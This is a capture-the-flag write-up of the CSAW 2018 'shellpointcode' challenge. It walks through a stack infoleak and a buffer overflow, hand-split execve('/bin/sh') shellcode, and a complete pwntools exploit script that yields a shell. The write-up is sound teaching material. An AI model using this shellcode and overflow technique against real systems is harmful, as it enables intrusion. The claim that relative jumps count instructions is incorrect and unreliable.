# Csaw 2018 Shellpointcode

Let's take a look at the binary:

```
$    ./shellpointcode
Linked lists are great!
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
15935728
(15 bytes) Text for node 2:
75395128
node1:
node.next: 0x7ffda2ffda40
node.buffer: 15935728

What are your initials?
123
Thanks 123

Segmentation fault (core dumped)
$    file shellpointcode
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
$    pwn checksec shellpointcode
[*] '/Hackery/pod/modules/crafting_shellcodePt1/csaw18_shellpointcode/shellpointcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

So we can see that we are dealing with a 64 bit binary that has RWX segments (regions of memory that we can read, write, and execute). We can see that with gdb:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /Hackery/pod/modules/crafting_shellcodePt1/csaw18_shellpointcode/shellpointcode
0x0000555555754000 0x0000555555755000 0x0000000000000000 r-x /Hackery/pod/modules/crafting_shellcodePt1/csaw18_shellpointcode/shellpointcode
0x0000555555755000 0x0000555555756000 0x0000000000001000 rwx /Hackery/pod/modules/crafting_shellcodePt1/csaw18_shellpointcode/shellpointcode
0x0000555555756000 0x0000555555777000 0x0000000000000000 rwx [heap]
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rwx /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rwx
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd9000 0x00007ffff7fdb000 0x0000000000000000 rwx
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rwx /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rwx
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

 In addition to that when we run it, we see that it prompts us for three separate inputs and prints what appears to be a stack address. When we take a look at the main function in Ghidra we see this:

```
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Linked lists are great! \nThey let you chain pieces of data together.\n");
  nononode();
  return 0;
}
```

Here we can see it calls the `nononode` which does this:

```
void nononode(void)

{
  undefined local_48 [8];
  undefined inp1 [24];
  undefined *inp0Ptr;
  undefined inp0 [24];
 
  inp0Ptr = local_48;
  puts("(15 bytes) Text for node 1:  ");
  readline(inp0,0xf);
  puts("(15 bytes) Text for node 2: ");
  readline(inp1,0xf);
  puts("node1: ");
  printNode(&inp0Ptr);
  goodbye();
  return;
}
```

Here we can see that it scans for input twice, in two `0xf` byte chunks. It then gives us a stack infoleak by printing out the address of `inp0Ptr` so we know where our first `0xf` byte chunk on the stack is. Then it calls the `goodbye` function which does this:

```
void goodbye(void)

{
  char vulnBuf [3];
 
  puts("What are your initials?");
  fgets(vulnBuf,0x20,stdin);
  printf("Thanks %s\n",vulnBuf);
  return;
}
```

So we can clearly see there is a buffer overflow bug with the fgets call. It is scanning in 32 (0x20) bytes into a 0x3 byte space (since it is at bp-0x3, and there's nothing below it on the stack). Since there is nothing else on the stack, and we have more than `0x10` bytes worth of overflow we should be able to reach the return address just fine.

So with that, we have an executable stack, a buffer overflow that grants us control of the return address, and a stack infoleak (which we can use to figure out the address of anything within that memory region, by using it's offset). The easy thing to do would be to just push shellcode to the stack, and call it. However the issue here it we don't have a single continuous block of memory to store it in. The biggest one we have is the 0x20 bytes from the goodbye call, however that one has to have an 0x8 byte address 11 bytes in to write over the return address, leaving us with onlu 21 bytes to work with across two separate blocks. What we will need to do here, is write/modify some custom shellcode to specifically fit in the multiple discontinuous chunks we have. I just managed to split my shellcode into two different 0xf (15) byte blocks, and stored them in inp0 and inp1, and just called inp0 using the infoleak. We already know from what we previously did that the offset from the infoleak we got to our second input is +0x8 bytes.

For writing the custom shellcode, we will be splitting up the shellcode into these two blocks. I did not write this shell code originally, I only modified it to fit this one particular use case (I just threw in a jmp instruction). The shellcode came from here: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/:


block 0:
```
  400080:    48 bf d1 9d 96 91 d0     movabs rdi,0xff978cd091969dd1
  400087:    8c 97 ff
  40008a:    e9 0c 00 00 00           jmp    40009b <_start+0x1b>
```

This block just executes two different instructions. The first just moves the hex string 0xff978cd091969dd1 (which is just the string /bin/sh\x00 noted) into the rdi register, and then calls the relative jump function. This will just jump x amount of instructions, where x is it's argument (which in this case it's 0xc, which is 12). To figure out how many instructions to jump, I examined the amount of instructions interpreted (since most data can be interpreted as an instruction, and our jmp call will) to see how many instructions I would need to jump ahead, and a bit of trial and error untill I got it right. We can see where the shellcode will jump in gdb (will help a lot if you use a script in this part):

```
gef➤  search-pattern 0xd091969dd1bf48
[+] Searching '0xd091969dd1bf48' in memory
[+] In '[heap]'(0x55b195217000-0x55b195238000), permission=rwx
  0x55b1952172e0 - 0x55b1952172fc  →   "\x48\xbf\xd1\x9d\x96\x91\xd0[...]"
[+] In '[stack]'(0x7ffcc0c31000-0x7ffcc0c52000), permission=rwx
  0x7ffcc0c508e8 - 0x7ffcc0c50904  →   "\x48\xbf\xd1\x9d\x96\x91\xd0[...]"
gef➤  x/2g 0x7ffcc0c508e8
0x7ffcc0c508e8:    0x8cd091969dd1bf48    0x0000000011e9ff97
gef➤  x/3i 0x7ffcc0c508e8
   0x7ffcc0c508e8:    movabs rdi,0xff978cd091969dd1
   0x7ffcc0c508f2:    jmp    0x7ffcc0c50908
   0x7ffcc0c508f7:    add    BYTE PTR [rdx+0x5b],ah
gef➤  x/5i 0x7ffcc0c50908
   0x7ffcc0c50908:    nop
   0x7ffcc0c50909:    xor    esi,esi
   0x7ffcc0c5090b:    mul    esi
   0x7ffcc0c5090d:    add    al,0x3b
   0x7ffcc0c5090f:    neg    rdi
```


Remember the relative jump opcode (0xe9) works off of the number instructions (which vary in bytes), not bytes.

block1:
```
  4000a8:    31 f6                    xor    esi,esi
  4000aa:    f7 e6                    mul    esi
  4000ac:    04 3b                    add    al,0x3b
  4000ae:    48 f7 df                 neg    rdi
  4000b1:    57                       push   rdi
  4000b2:    54                       push   rsp
  4000b3:    5f                       pop    rdi
  4000b4:    0f 05                    syscall
```
Here is the rest of the shellcode. It essentially just sets for the syscall which will give us a shell, then makes the syscall. All we really did with the shellcode was move around some of the instructions, and add a jmp instruction.

Here is a look at the shellcode precompiled. The NOPs represent the space between the two segments,
```
$    cat shellcode.asm
[SECTION .text]
global _start
_start:
    mov rdi, 0xff978cd091969dd1
    jmp 0x10
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    xor esi, esi
    mul esi
    add al, 0x3b    
    neg rdi
    push rdi
    push rsp
    pop rdi
    syscall
```

and to compile the shellcode:

```
$    nasm -f elf64 shellcode.asm
$    ld -o sheller shellcode.o
$    objdump -D sheller -M intel

sheller:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:    48 bf d1 9d 96 91 d0     movabs rdi,0xff978cd091969dd1
  400087:    8c 97 ff
  40008a:    e9 0c 00 00 00           jmp    40009b <_start+0x1b>
  40008f:    90                       nop
  400090:    90                       nop
  400091:    90                       nop
  400092:    90                       nop
  400093:    90                       nop
  400094:    90                       nop
  400095:    90                       nop
  400096:    90                       nop
  400097:    90                       nop
  400098:    90                       nop
  400099:    90                       nop
  40009a:    90                       nop
  40009b:    90                       nop
  40009c:    90                       nop
  40009d:    90                       nop
  40009e:    90                       nop
  40009f:    90                       nop
  4000a0:    90                       nop
  4000a1:    90                       nop
  4000a2:    90                       nop
  4000a3:    90                       nop
  4000a4:    90                       nop
  4000a5:    90                       nop
  4000a6:    90                       nop
  4000a7:    90                       nop
  4000a8:    31 f6                    xor    esi,esi
  4000aa:    f7 e6                    mul    esi
  4000ac:    04 3b                    add    al,0x3b
  4000ae:    48 f7 df                 neg    rdi
  4000b1:    57                       push   rdi
  4000b2:    54                       push   rsp
  4000b3:    5f                       pop    rdi
  4000b4:    0f 05                    syscall
```

Putting it all together, we get the following exploit:

```
# Import pwntools
from pwn import *

# Establish the target process
#target = process('./shellpointcode')
target = remote('pwn.chal.csaw.io', 9005)
#gdb.attach(target)


# Establish the two 15 byte shellcode blocks
s0 = "\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xe9\x11\x00\x00\x00"
s1 = "\x90\x31\xf6\xf7\xe6\x04\x3b\x48\xf7\xdf\x57\x54\x5f\x0f\x05"


# Send the second block first, since it will be stored in memory where it will be executed second
print target.recvline('node 1:\n')
target.sendline(s1)

# Send the first block of shell code
print target.recvline('node 2:\n')
target.sendline(s0)

# Grab and filter out the infoleak
print target.recvuntil('node.next:')
leak = target.recvline()
leak = leak.replace('\x0a', '')
print 'leak: ' + leak
leak = int(leak, 16)
log.info("Leak is: " + hex(leak))

# Send the buffer overflow to overwrite the return address to our shellcode, and get code exec
target.sendline('0'*11 + p64(leak + 0x8))

# Drop to an interactive shell
target.interactive('node.next: ')
```
and when we run it:

```
$    python exploit.py
[+] Starting local process './shellpointcode': pid 24064
Linked lists are great!

They let you chain pieces of data together.


(15 bytes) Text for node 1:  
(15 bytes) Text for node 2:
node1:
node.next:
leak:  0x7ffdfd5fcca0
[*] Leak is: 0x7ffdfd5fcca0
[*] Switching to interactive mode
node.buffer: \x901���;H��WT_\x0f\x05
What are your initials?
Thanks 00000000000\xa8�_��
node.next:                         w
 01:26:01 up  7:47,  1 user,  load average: 0.95, 0.85, 0.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               17:41   ?xdm?  38:30   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
node.next: ls
core        readme.md       shellcode.o    shellpointcode
exploit.py  shellcode.asm  sheller
node.next:
[*] Interrupted
[*] Stopped process './shellpointcode' (pid 24064)
guyinatuxedo@tux:/Hackery/pod/modules/crafting_shellcodeP
```

Just like that, we captured the flag!
